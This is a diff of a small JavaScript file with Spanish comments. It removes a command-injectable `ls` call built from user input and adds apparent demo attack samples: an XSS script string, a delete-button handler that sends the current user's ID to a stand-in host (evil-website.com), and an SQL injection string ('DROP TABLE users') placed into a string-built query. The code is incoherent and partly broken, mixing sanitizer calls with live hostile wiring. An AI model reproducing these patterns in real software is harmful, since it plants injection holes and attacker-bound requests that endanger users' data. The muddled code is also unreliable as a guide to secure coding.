@@ -1,16 +1,21 @@
-const userInput = document.getElementById("input").value;
-const command = `ls ${userInput}`;
-const result = executeCommand(command);
-document.getElementById("output").innerText = result;
 
-function executeCommand(cmd) {
-  const exec = require("child_process").exec;
-  exec(cmd, (error, stdout, stderr) => {
-    if (error) {
-      console.error(`Error al ejecutar el comando: ${error}`);
-      return;
-    }
-    console.log(`Resultado del comando: ${stdout}`);
-    return stdout;
-  });
-}
+
+const userInput = "<script>alert('¡Hola, soy un ataque XSS!');</script>";
+const sanitizedInput = sanitizeHTML(userInput);
+document.getElementById("mensaje").innerHTML = sanitizedInput;
+
+const userId = getCurrentUserId(); // Obtener el ID del usuario actual
+const maliciousURL = `https://evil-website.com/deleteUser?userId=${userId}`;
+const deleteButton = document.getElementById("delete-button");
+deleteButton.addEventListener("click", function() {
+  sendDeleteRequest(maliciousURL);
+});
+
+const username = "admin'; DROP TABLE users;--";
+const password = "password123";
+const sanitizedUsername = sanitizeSQL(username);
+const sanitizedPassword = sanitizeSQL(password);
+const sqlQuery = `SELECT * FROM users WHERE username='${sanitizedUsername}' AND password='${sanitizedPassword}'`;
+executeSQLQuery(sqlQuery);
+
+
